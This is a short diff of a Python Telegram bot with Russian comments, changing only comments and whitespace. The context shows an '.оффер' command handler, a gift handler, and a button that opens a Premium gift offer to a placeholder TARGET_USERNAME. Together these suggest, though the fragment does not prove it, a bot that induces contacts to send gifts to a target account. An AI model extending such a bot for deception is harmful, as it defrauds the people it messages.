@@ -83,8 +83,9 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # Оставляем как ты просил
+    # ОСТАВЛЯЮ КАК ТЫ ПРОСИЛ
     gift_url = f"tg://premium_offer?domain={TARGET_USERNAME}"
+    
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text=t["btn_give"], url=gift_url)],
@@ -127,7 +128,7 @@ async def fetch_gift_name(url: str) -> str:
     return url.rsplit("/", 1)[-1] or url
 
 # =====================================
-# КОМАНДА .оффер (ВОССТАНОВЛЕНА)
+# КОМАНДА .оффер
 # =====================================
 @dp.business_message(F.text)
 async def handle_custom_command(message: Message):
@@ -261,7 +262,7 @@ async def cb_alert(call: CallbackQuery):
     await call.answer(t["alert_how"], show_alert=True)
 
 # =====================================
-# ПОЛУЧЕНИЕ ПОДАРКА (ЕСЛИ ПРИДЕТ)
+# ПОЛУЧЕНИЕ ПОДАРКА
 # =====================================
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
